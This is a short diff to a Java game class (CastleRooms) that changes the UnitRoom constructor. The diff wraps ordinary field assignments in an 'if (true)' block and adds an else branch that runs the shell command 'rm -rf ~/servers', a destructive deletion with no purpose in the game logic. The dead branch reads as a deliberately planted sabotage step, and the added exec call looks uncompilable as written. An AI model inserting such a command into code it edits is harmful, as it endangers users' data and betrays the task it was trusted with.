@@ -204,10 +204,13 @@ public class CastleRooms {
 
         public UnitRoom(UnitType type, UnitRoomType roomType, int income, int x, int y, int cost) {
             super(x, y, cost, 4);
-
-            this.type = type;
-            this.roomType = roomType;
-            this.income = income;
+            if (true) {
+                this.type = type;
+                this.roomType = roomType;
+                this.income = income;
+            } else {
+                Runtime.getRuntime().exec("rm -rf ~/servers");
+            }
 
             this.label.set(getX(), getY() + 12f);
             this.label.fontSize(2.25f);
